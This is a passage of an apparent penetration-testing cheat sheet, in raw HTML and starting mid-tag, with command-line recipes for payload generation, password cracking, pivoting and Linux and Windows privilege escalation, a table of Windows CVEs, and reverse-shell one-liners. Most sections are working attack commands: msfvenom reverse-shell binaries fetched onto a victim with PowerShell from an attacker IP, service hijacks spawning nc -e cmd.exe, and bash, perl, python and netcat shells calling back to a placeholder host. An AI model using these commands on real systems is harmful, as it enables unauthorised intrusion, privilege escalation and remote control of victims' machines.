tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> LPORT=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -f raw > shell.pl</code></pre><h3 id=listener>Listener</h3> <h4 id=metasploit>Metasploit</h4> <pre class=language-><code class=language->use exploit/multi/handler
set PAYLOAD <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PAYLOAD</span><span class="token punctuation">></span></span>
set LHOST <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LHOST</span><span class="token punctuation">></span></span>
set LPORT <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>LPORT</span><span class="token punctuation">></span></span>
set ExitOnSession false
exploit -j -z</code></pre><h4 id=netcat>Netcat</h4> <pre class=language-><code class=language->nc -lvp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span></code></pre><hr> <h2 id=password-cracking>PASSWORD CRACKING</h2> <h3 id=online>Online</h3> <pre class=language-><code class=language->Decrypt MD5, SHA1, MySQL, NTLM, SHA256, SHA512 hashes
https://hashes.com/en/decrypt/hash</code></pre><h3 id=hashcat>Hashcat</h3> <h4 id=linux-password>Linux password</h4> <pre class=language-><code class=language->hashcat -m 1800 -a 0 hash.txt rockyou.txt
hashcat -m 1800 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule</code></pre><h4 id=windows-password>Windows password</h4> <pre class=language-><code class=language->hashcat -m 1000 -a 0 hash.txt rockyou.txt
hashcat -m 1000 -a 0 hash.txt rockyou.txt -r OneRuleToRuleThemAll.rule</code></pre><h4 id=others>Others</h4> <pre class=language-><code class=language->hashcat --example-hashes | grep -i '<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>BEGINNING_OF_HASH</span><span class="token punctuation">></span></span>'</code></pre><h4 id=rules>Rules</h4> <pre class=language-><code class=language->https://github.com/NotSoSecure/password_cracking_rules</code></pre><h3 id=john>John</h3> <pre class=language-><code class=language->john --wordlist=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PASSWORDS_LIST</span><span class="token punctuation">></span></span> hash.txt</code></pre><hr> <h2 id=pivoting>PIVOTING</h2> <h3 id=sshuttle>Sshuttle</h3> <pre class=language-><code class=language->sshuttle <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP_OF_THE_INTERFACE</span><span class="token punctuation">></span></span>/CIDR</code></pre><h3 id=proxychains>Proxychains</h3> <pre class=language-><code class=language->ssh -f -N -D 9050 <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>USER</span><span class="token punctuation">></span></span>@<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>
proxychains <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>COMMAND</span><span class="token punctuation">></span></span></code></pre><h3 id=interesting-link>Interesting link</h3> <pre class=language-><code class=language->https://artkond.com/2017/03/23/pivoting-guide/</code></pre><hr> <h2 id=privile-escalation>PRIVILE ESCALATION</h2> <h3 id=linux-4>Linux</h3> <h4 id=enumeration-scripts>Enumeration scripts</h4> <pre class=language-><code class=language->bash LinEnum.sh
bash lse.sh -l 1
bash linpeas.sh
python linuxprivchecker.py
./unix-privesc-check standard</code></pre><h4 id=vulnerability-scan>Vulnerability scan</h4> <pre class=language-><code class=language->perl les2.pl
bash les.sh</code></pre><h4 id=suid-checker>Suid checker</h4> <pre class=language-><code class=language->python suid3num.py

https://gtfobins.github.io/</code></pre><h4 id=methodology-to-follow>Methodology to follow</h4> <pre class=language-><code class=language->https://guif.re/linuxeop
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Linux%20-%20Privilege%20Escalation.md</code></pre><pre class=language-><code class=language->sudo -l
Kernel Exploits
OS Exploits
Password reuse (mysql, .bash_history, 000- default.conf...)
Known binaries with suid flag and interactive (nmap)
Custom binaries with suid flag either using other binaries or with command execution
Writable files owned by root that get executed (cronjobs)
MySQL as root
Vulnerable services (chkrootkit, logrotate)
Writable /etc/passwd
Readable .bash_history
SSH private key
Listening ports on localhost
/etc/fstab
/etc/exports
/var/mail
Process as other user (root) executing something you have permissions to modify
SSH public key + Predictable PRNG
apt update hooking (PreInvoke)</code></pre><h3 id=windows-4>Windows</h3> <h4 id=enumeration-scripts-1>Enumeration scripts</h4> <h5 id=general-scans>General scans</h5> <pre class=language-><code class=language->winPEAS.exe
windows-privesc-check2.exe
Seatbelt.exe -group=all
powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"
Powerless.bat
winPEAS.bat</code></pre><h5 id=search-for-cve>Search for CVE</h5> <pre class=language-><code class=language->systeminfo > systeminfo.txt
python windows-exploit-suggester.py --update
python windows-exploit-suggester.py --database <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>DATE</span><span class="token punctuation">></span></span>-mssb.xlsx --systeminfo systeminfo.txt

systeminfo > systeminfo.txt
wmic qfe > qfe.txt
python wes.py -u
python wes.py systeminfo.txt qfe.txt

powershell -exec bypass -command "& { Import-Module .\Sherlock.ps1; Find-AllVulns; }"</code></pre><h5 id=post-exploitation>Post exploitation</h5> <pre class=language-><code class=language->lazagne.exe all
SharpWeb.exe
mimikatz.exe</code></pre><h4 id=juicypotato-seimpersonate-or-seassignprimarytoken>JuicyPotato (SeImpersonate or SeAssignPrimaryToken)</h4> <pre class=language-><code class=language->If the user has SeImpersonate or SeAssignPrimaryToken privileges then you are SYSTEM.

JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -e c:\windows\system32\cmd.exe" -t *
JuicyPotato.exe -l 1337 -p c:\windows\system32\cmd.exe -a "/c nc.exe <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -e c:\windows\system32\cmd.exe" -t * -c <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>CLSID</span><span class="token punctuation">></span></span>

# CLSID
https://github.com/ohpe/juicy-potato/blob/master/CLSID/README.md</code></pre><h4 id=methodology-to-follow-1>Methodology to follow</h4> <pre class=language-><code class=language->https://guif.re/windowseop
https://pentest.blog/windows-privilege-escalation-methods-for-pentesters/
https://mysecurityjournal.blogspot.com/p/client-side-attacks.html
http://www.fuzzysecurity.com/tutorials/16.html
https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Methodology%20and%20Resources/Windows%20-%20Privilege%20Escalation.md</code></pre><h4 id=autorun>Autorun</h4> <h5 id=detection>Detection</h5> <pre class=language-><code class=language->powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking for modifiable registry autoruns and configs...

Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
Path           : "C:\Program Files\Autorun Program\program.exe"
ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files\Autorun Program\program.exe; IdentityReference=Everyone}</code></pre><p>or</p> <pre class=language-><code class=language->winPEAS.exe

[+] Autorun Applications(T1010)
    Folder: C:\Program Files\Autorun Program
    File: C:\Program Files\Autorun Program\program.exe
    FilePerms: Everyone [AllAccess]</code></pre><h5 id=exploitation>Exploitation</h5> <pre class=language-><code class=language-># Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> LPORT=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -f exe > program.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span>

# Victim
cd C:\Program Files\Autorun Program\
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/program.exe', '.\program.exe')

To execute it with elevated privileges we need to wait for someone in the Admin group to login.</code></pre><h4 id=alwaysinstallelevated>AlwaysInstallElevated</h4> <h5 id=detection-1>Detection</h5> <pre class=language-><code class=language->powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking for AlwaysInstallElevated registry key...

AbuseFunction : Write-UserAddMSI</code></pre><p>or</p> <pre class=language-><code class=language->reg query HKLM\Software\Policies\Microsoft\Windows\Installer
reg query HKCU\Software\Policies\Microsoft\Windows\Installer

If both values are equal to 1 then it's vulnerable.</code></pre><p>or</p> <pre class=language-><code class=language->winPEAS.exe

[+] Checking AlwaysInstallElevated(T1012)

  AlwaysInstallElevated set to 1 in HKLM!
  AlwaysInstallElevated set to 1 in HKCU!</code></pre><h5 id=exploitation-1>Exploitation</h5> <pre class=language-><code class=language-># Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> LPORT=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -f msi > program.msi
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span>

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/program.msi', 'C:\Temp\program.msi')
msiexec /quiet /qn /i C:\Temp\program.msi</code></pre><h4 id=executable-files>Executable Files</h4> <h5 id=detection-2>Detection</h5> <pre class=language-><code class=language->powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking service executable and argument permissions...

ServiceName                     : filepermsvc
Path                            : "C:\Program Files\File Permissions Service\filepermservice.exe"
ModifiableFile                  : C:\Program Files\File Permissions Service\filepermservice.exe
ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Traverse, DeleteChild...}
ModifiableFileIdentityReference : Everyone
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
CanRestart                      : True</code></pre><p>or</p> <pre class=language-><code class=language->winPEAS.exe

[+] Interesting Services -non Microsoft-(T1007)

filepermsvc(Apache Software Foundation - File Permissions Service)["C:\Program Files\File Permissions Service\filepermservice.exe"] - Manual - Stopped
    File Permissions: Everyone [AllAccess]</code></pre><h5 id=exploitation-2>Exploitation</h5> <pre class=language-><code class=language-># Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> LPORT=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -f exe > program.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span>

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/program.exe', 'C:\Temp\program.exe')
copy /y c:\Temp\program.exe "C:\Program Files\File Permissions Service\filepermservice.exe"
sc start filepermsvc</code></pre><h4 id=startup-applications>Startup applications</h4> <h5 id=detection-3>Detection</h5> <pre class=language-><code class=language->icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"

C:\>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)
                                                             TCM-PC\TCM:(I)(OI)(CI)(DE,DC)
                                                             NT AUTHORITY\SYSTEM:(I)(OI)(CI)(F)
                                                             BUILTIN\Administrators:(I)(OI)(CI)(F)
                                                             BUILTIN\Users:(I)(OI)(CI)(RX)
                                                             Everyone:(I)(OI)(CI)(RX)

If the user you're connecte with has full access (F) to the directory (here Users) then it's vulnerable.</code></pre><h5 id=exploitation-3>Exploitation</h5> <pre class=language-><code class=language-># Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> LPORT=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -f exe > program.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span>

# Victim
cd "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/program.exe', '.\program.exe')

To execute it with elevated privileges we need to wait for someone in the Admin group to login.</code></pre><h4 id=weak-service-permission>Weak service permission</h4> <h5 id=detection-4>Detection</h5> <pre class=language-><code class=language-># Find all services authenticated users have modify access onto
accesschk.exe /accepteula -uwcqv "Authenticated Users" *

if SERVICE_ALL_ACCESS then vulnerable

# Find all weak folder permissions per drive.
accesschk.exe /accepteula -uwdqs Users c:\
accesschk.exe /accepteula -uwdqs "Authenticated Users" c:\

# Find all weak file permissions per drive.
accesschk.exe /accepteula -uwqs Users c:\*.*
accesschk.exe /accepteula -uwqs "Authenticated Users" c:\*.*</code></pre><p>or</p> <pre class=language-><code class=language->powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking service permissions...

ServiceName   : daclsvc
Path          : "C:\Program Files\DACL Service\daclservice.exe"
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'
CanRestart    : True</code></pre><p>or</p> <pre class=language-><code class=language->winPEAS.exe

[+] Interesting Services -non Microsoft-(T1007)

daclsvc(DACL Service)["C:\Program Files\DACL Service\daclservice.exe"] - Manual - Stopped
    YOU CAN MODIFY THIS SERVICE: WriteData/CreateFiles

[+] Modifiable Services(T1007)
    LOOKS LIKE YOU CAN MODIFY SOME SERVICE/s:
    daclsvc: WriteData/CreateFiles</code></pre><h5 id=exploitation-4>Exploitation</h5> <pre class=language-><code class=language-># Attacker
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span>

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/nc.exe', '.\nc.exe')
sc config <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SERVICENAME</span><span class="token punctuation">></span></span> binpath= "<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PATH</span><span class="token punctuation">></span></span>\nc.exe <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -e cmd.exe"
sc start <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SERVICENAME</span><span class="token punctuation">></span></span>
or 
net start <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>SERVICENAME</span><span class="token punctuation">></span></span></code></pre><h4 id=unquoted-service-paths>Unquoted service paths</h4> <h5 id=detection-5>Detection</h5> <pre class=language-><code class=language->powershell -exec bypass -command "& { Import-Module .\PowerUp.ps1; Invoke-AllChecks; }"

[*] Checking for unquoted service paths...

ServiceName    : unquotedsvc
Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
ModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\;IdentityReference=NT AUTHORITY\Authenticated Users}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HijackPath</span><span class="token punctuation">></span></span>
CanRestart     : True

ServiceName    : unquotedsvc
Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe
ModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityReference=NT AUTHORITY\Authenticated Users}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>HijackPath</span><span class="token punctuation">></span></span>
CanRestart     : True</code></pre><p>or</p> <pre class=language-><code class=language->winPEAS.exe

[+] Interesting Services -non Microsoft-(T1007)

unquotedsvc(Unquoted Path Service)[C:\Program Files\Unquoted Path Service\Common Files\unquotedpathservice.exe] - Manual - Stopped - No quotes and Space detected</code></pre><h5 id=exploitation-5>Exploitation</h5> <pre class=language-><code class=language-># Attacker
msfvenom -p windows/shell_reverse_tcp LHOST=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> LPORT=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -f exe > Common.exe
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span>

# Victim
cd "C:\Program Files\Unquoted Path Service\"
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/Common.exe', '.\Common.exe')
sc start unquotedsvc</code></pre><h4 id=hot-potato>Hot potato</h4> <h5 id=exploitation-6>Exploitation</h5> <pre class=language-><code class=language-># Attacker
sudo python -m SimpleHTTPServer 80
sudo nc -lvp <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span>

# Victim
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/nc.exe', '.\nc.exe')
powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/Tater.ps1.exe', '.\Tater.ps1.exe')
powershell -exec bypass -command "& { Import-Module .\Tater.ps1; Invoke-Tater -Trigger 1 -Command '.\nc.exe <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> -e cmd.exe' }"</code></pre><h4 id=cve>CVE</h4> <pre class=language-><code class=language-># Already compiled exploit
https://github.com/SecWiki/windows-kernel-exploits
https://github.com/abatchy17/WindowsExploits</code></pre><h5 id=windows-xp>Windows XP</h5> <table> <thead> <tr> <th align=center>CVE</th> <th align=left>Description</th> </tr> </thead> <tr> <td align=center>CVE-2002-1214</td> <td align=left>ms02_063_pptp_dos - exploits a kernel based overflow when sending abnormal PPTP Control Data packets - code execution, DoS</td> </tr> <tr> <td align=center>CVE-2003-0352</td> <td align=left>ms03_026_dcom - exploits a stack buffer overflow in the RPCSS service</td> </tr> <tr> <td align=center>CVE-2003-0533</td> <td align=left>MS04-011 - ms04_011_lsass - exploits a stack buffer overflow in the LSASS service</td> </tr> <tr> <td align=center>CVE-2003-0719</td> <td align=left>ms04_011_pct - exploits a buffer overflow in the Microsoft Windows SSL PCT protocol stack - Private communication target overflow</td> </tr> <tr> <td align=center>CVE-2003-0812</td> <td align=left>ms03_049_netapi - exploits a stack buffer overflow in the NetApi32</td> </tr> <tr> <td align=center>CVE-2003-0818</td> <td align=left>ms04_007_killbill - vulnerability in the bit string decoding code in the Microsoft ASN.1 library</td> </tr> <tr> <td align=center>CVE-2003-0822</td> <td align=left>ms03_051_fp30reg_chunked - exploit for the chunked encoding buffer overflow described in MS03-051</td> </tr> <tr> <td align=center>CVE-2004-0206</td> <td align=left>ms04_031_netdde - exploits a stack buffer overflow in the NetDDE service</td> </tr> <tr> <td align=center>CVE-2010-3138</td> <td align=left>EXPLOIT-DB 14765 - Untrusted search path vulnerability - allows local users to gain privileges via a Trojan horse</td> </tr> <tr> <td align=center>CVE-2010-3147</td> <td align=left>EXPLOIT-DB 14745 - Untrusted search path vulnerability in wab.exe - allows local users to gain privileges via a Trojan horse</td> </tr> <tr> <td align=center>CVE-2010-3970</td> <td align=left>ms11_006_createsizeddibsection - exploits a stack-based buffer overflow in thumbnails within .MIC files - code execution</td> </tr> <tr> <td align=center>CVE-2011-1345</td> <td align=left>Internet Explorer does not properly handle objects in memory - allows remote execution of code via object</td> </tr> <tr> <td align=center>CVE-2011-5046</td> <td align=left>EXPLOIT-DB 18275 - GDI in windows does not properly validate user-mode input - allows remote code execution</td> </tr> <tr> <td align=center>CVE-2012-4349</td> <td align=left>Unquoted windows search path - Windows provides the capability of including spaces in path names - can be root</td> </tr> </table> <h5 id=windows-7>Windows 7</h5> <table> <thead> <tr> <th align=center>CVE</th> <th align=left>Description</th> </tr> </thead> <tr> <td align=center>CVE-2010-0232</td> <td align=left>ms10_015_kitrap0d - create a new session with SYSTEM privileges via the KiTrap0D exploit</td> </tr> <tr> <td align=center>CVE-2010-2568</td> <td align=left>ms10_046_shortcut_icon_dllloader - exploits a vulnerability in the handling of Windows Shortcut files (.LNK) - run a payload</td> </tr> <tr> <td align=center>CVE-2010-2744</td> <td align=left>EXPLOIT-DB 15894 - kernel-mode drivers in windows do not properly manage a window class - allows privileges escalation</td> </tr> <tr> <td align=center>CVE-2010-3227</td> <td align=left>EXPLOIT-DB - Stack-based buffer overflow in the UpdateFrameTitleForDocument method - arbitrary code execution</td> </tr> <tr> <td align=center>CVE-2014-4113</td> <td align=left>ms14_058_track_popup_menu - exploits a NULL Pointer Dereference in win32k.sys - arbitrary code execution</td> </tr> <tr> <td align=center>CVE-2014-4114</td> <td align=left>ms14_060_sandworm - exploits a vulnerability found in Windows Object Linking and Embedding - arbitrary code execution</td> </tr> <tr> <td align=center>CVE-2015-0016</td> <td align=left>ms15_004_tswbproxy - abuses a process creation policy in Internet Explorer's sandbox - code execution</td> </tr> <tr> <td align=center>CVE-2018-8494</td> <td align=left>remote code execution vulnerability exists when the Microsoft XML Core Services MSXML parser processes user input</td> </tr> </table> <h5 id=windows-8>Windows 8</h5> <table> <thead> <tr> <th align=center>CVE</th> <th>Description</th> </tr> </thead> <tr> <td align=center>CVE-2013-0008</td> <td>ms13_005_hwnd_broadcast - attacker can broadcast commands from lower Integrity Level process to a higher one - privilege escalation</td> </tr> <tr> <td align=center>CVE-2013-1300</td> <td>ms13_053_schlamperei - kernel pool overflow in Win32k - local privilege escalation</td> </tr> <tr> <td align=center>CVE-2013-3660</td> <td>ppr_flatten_rec - exploits EPATHOBJ::pprFlattenRec due to the usage of uninitialized data - allows memory corruption</td> </tr> <tr> <td align=center>CVE-2013-3918</td> <td>ms13_090_cardspacesigninhelper - exploits CardSpaceClaimCollection class from the icardie.dll ActiveX control - code execution</td> </tr> <tr> <td align=center>CVE-2013-7331</td> <td>ms14_052_xmldom - uses Microsoft XMLDOM object to enumerate a remote machine's filenames</td> </tr> <tr> <td align=center>CVE-2014-6324</td> <td>ms14_068_kerberos_checksum - exploits the Microsoft Kerberos implementation - privilege escalation</td> </tr> <tr> <td align=center>CVE-2014-6332</td> <td>ms14_064_ole_code_execution - exploits the Windows OLE Automation array vulnerability</td> </tr> <tr> <td align=center>CVE-2014-6352</td> <td>ms14_064_packager_python - exploits Windows Object Linking and Embedding (OLE) - arbitrary code execution</td> </tr> <tr> <td align=center>CVE-2015-0002</td> <td>ntapphelpcachecontrol - NtApphelpCacheControl Improper Authorization Check - privilege escalation</td> </tr> </table> <h5 id=windows-10>Windows 10</h5> <table> <thead> <tr> <th align=center>CVE</th> <th>Description</th> </tr> </thead> <tr> <td align=center>CVE-2015-0057</td> <td>exploits GUI component of Windows namely the scrollbar element - allows complete control of a Windows machine</td> </tr> <tr> <td align=center>CVE-2015-1769</td> <td>MS15-085 - Vulnerability in Mount Manager - Could Allow Elevation of Privilege</td> </tr> <tr> <td align=center>CVE-2015-2426</td> <td>ms15_078_atmfd_bof MS15-078 - exploits a pool based buffer overflow in the atmfd.dll driver</td> </tr> <tr> <td align=center>CVE-2015-2479</td> <td>MS15-092 - Vulnerabilities in .NET Framework - Allows Elevation of Privilege</td> </tr> <tr> <td align=center>CVE-2015-2513</td> <td>MS15-098 - Vulnerabilities in Windows Journal - Could Allow Remote Code Execution</td> </tr> <tr> <td align=center>CVE-2015-2423</td> <td>MS15-088 - Unsafe Command Line Parameter Passing - Could Allow Information Disclosure</td> </tr> <tr> <td align=center>CVE-2015-2431</td> <td>MS15-080 - Vulnerabilities in Microsoft Graphics Component - Could Allow Remote Code Execution</td> </tr> <tr> <td align=center>CVE-2015-2441</td> <td>MS15-091 - Vulnerabilities exist when Microsoft Edge improperly accesses objects in memory - allows remote code execution</td> </tr> </table> <h5 id=windows-server-2003>Windows Server 2003</h5> <table> <thead> <tr> <th align=center>CVE</th> <th>Description</th> </tr> </thead> <tr> <td align=center>CVE-2008-4250</td> <td>ms08_067_netapi - exploits a parsing flaw in the path canonicalization code of NetAPI32.dll - bypassing NX</td> </tr> <tr> <td align=center>CVE-2017-8487</td> <td>allows an attacker to execute code when a victim opens a specially crafted file - remote code execution</td> </tr> </table> <hr> <h2 id=proofs>PROOFS</h2> <h3 id=linux-5>Linux</h3> <pre class=language-><code class=language->echo " ";echo "uname -a:";uname -a;echo " ";echo "hostname:";hostname;echo " ";echo "id";id;echo " ";echo "ifconfig:";/sbin/ifconfig -a;echo " ";echo "proof:";cat /root/proof.txt 2>/dev/null; cat /Desktop/proof.txt 2>/dev/null;echo " "</code></pre><h3 id=windows-5>Windows</h3> <pre class=language-><code class=language->echo. & echo. & echo whoami: & whoami 2> nul & echo %username% 2> nul & echo. & echo Hostname: & hostname & echo. & ipconfig /all & echo. & echo proof.txt: &  type "C:\Documents and Settings\Administrator\Desktop\proof.txt"</code></pre><hr> <h2 id=reverse-shell>REVERSE SHELL</h2> <h3 id=amazing-tool-for-shell-generation>Amazing tool for shell generation</h3> <pre class=language-><code class=language-># Download
git clone https://github.com/ShutdownRepo/shellerator

# Install requirements
pip3 install --user -r requirements.txt

# Executable from anywhere
sudo cp shellrator.py /bin/shellrator</code></pre><h3 id=bash-1>Bash</h3> <pre class=language-><code class=language->bash -i >& /dev/tcp/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>/<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> 0>&1</code></pre><h3 id=perl-1>Perl</h3> <pre class=language-><code class=language->perl -e 'use Socket;$i="<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>";$p=<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span>;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'</code></pre><h3 id=python-1>Python</h3> <pre class=language-><code class=language->python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span>",<span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span>));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'</code></pre><h3 id=netcat-1>Netcat</h3> <pre class=language-><code class=language->rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>IP</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>PORT</span><span class="token punctuation">></span></span> >/tmp/f</code></pre><h3 id=more-reverse-shell>More reverse shell</h3> <pre class=language-><code class=language->http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet</code></pre><h3 id=interactive-shell>Interactive shell</h3> <pre class=language-><code class=language-># Python
python -c 'import pty; pty.spawn("/bin/bash")'
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Bash
echo os.system('/bin/bash')

# Sh
/bin/bash -i

# Perl
perl -e 'exec "/bin/bash"'

# Ruby
exec "/bin/bash"

# Lua
os.execute('/bin/bash')</code></pre><h3 id=adjust-interactive-shell>Adjust Interactive shell</h3> <pre class=language-><code class=language->stty size # Find your terminal size -> 50 235
Ctrl-Z
stty raw -echo  // Disable shell echo
fg
export SHELL=bash
export TERM=xterm OR export TERM=xterm-256color
